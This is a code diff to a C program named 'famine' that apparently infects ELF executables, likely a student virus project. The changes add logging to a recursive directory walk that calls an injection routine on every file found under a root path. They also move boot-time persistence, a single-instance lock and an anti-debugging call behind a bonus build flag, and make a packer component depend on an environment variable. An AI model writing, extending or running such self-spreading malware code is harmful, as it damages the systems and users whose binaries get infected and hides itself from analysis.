@@ -3,11 +3,11 @@
 void famine(char *fullpath, void *input, int woody_init_ok) {
     FamineFile *file = famine_elf_file_get(fullpath);
     if (file != NULL) {
-        DBG("ELF file loaded successfully. Size: %lu bytes\n", file->size);
+        DBG("ELF file %s successfully. Size: %lu bytes\n", fullpath, file->size);
         famine_injection(file, input, woody_init_ok);
         destroy_famine_file(file);
     } else {
-        LOG(L_ERROR, "Failed to load ELF file.\n");
+        LOG(L_ERROR, "Failed to load ELF file %s.\n", fullpath);
     }
 }
 
@@ -23,7 +23,16 @@ void famine_process_recurcive(const char *path, void *input, int woody_init_ok) 
     }
 
     while ((entry = readdir(dir)) != NULL) {
+
+        INFO("Processing: %s/%s\n", path, entry->d_name);
+
+        if (entry->d_type == DT_FIFO) {
+            INFO("Skipping FIFO directory entry: %s\n", entry->d_name);
+            continue;
+        }
+
         if (!ft_strcmp(entry->d_name, ".") || !ft_strcmp(entry->d_name, "..")) {
+            INFO("Skipping special directory entry: %s\n", entry->d_name);
             continue;
         }
 
@@ -34,12 +43,15 @@ void famine_process_recurcive(const char *path, void *input, int woody_init_ok) 
         }
 
         if (lstat(fullpath, &st) == -1 || S_ISLNK(st.st_mode)) {
+            INFO("Skipping symlink or inaccessible entry: %s\n", fullpath);
             continue;
         }
 
         if (S_ISDIR(st.st_mode)) {
+            INFO("Entering directory: %s\n", fullpath);
             famine_process_recurcive(fullpath, input, woody_init_ok);
         } else {
+            INFO("Call famine on: %s\n", fullpath);
             famine(fullpath, input, woody_init_ok);
         }
     }
@@ -55,9 +67,9 @@ void famine_main(void *input, int woody_init_ok) {
         }
         int lock_fd = lock_global();
 
-        setup_boot_start();
-        exit_if_process_running();
         #ifdef FAMINE_BONUS
+            setup_boot_start();
+            exit_if_process_running(lock_fd);
             char *root_path = getenv("FAMINE_ROOT_PATH");
             if (root_path) {
                 famine_process_recurcive(root_path, input, woody_init_ok);
@@ -75,20 +87,31 @@ void famine_main(void *input, int woody_init_ok) {
 
 int main(int argc, char **argv) {
     set_log_level(L_DEBUG);
-    // set_log_level(L_NONE);
-    anti_debug();
 
     (void)argc, (void)argv;
 
+
     #ifdef FAMINE_BONUS
         UserInput	input = {0};
-        int         woody_init_ok = TRUE;
+        int         woody_init_ok = FALSE;
         int 		ret = 0;
-	    input.key_len = KEY_LEN;
-		ret = woody_bonus_init(argv, &input, argc);
-		if (!ret) {
-            woody_init_ok = FALSE;
+	    
+        anti_debug();
+
+        input.key_len = KEY_LEN;
+		char *woody_enable = getenv("FAMINE_WOODY_ENABLE");
+        char *lower_woody_enable = NULL;
+        if (woody_enable) {
+            lower_woody_enable = str_tolower(woody_enable);
+            if (ft_strcmp(lower_woody_enable, "true") == 0) {
+                ret = woody_bonus_init(argv, &input, argc);
+                if (ret != 0) {
+                    INFO(GREEN "Woody bonus ENABLED, initialization successful.\n" RESET);
+                    woody_init_ok = TRUE;
+                } 
+            }
         }
+
         famine_main(&input, woody_init_ok);
         input_destroy(&input);
     #else
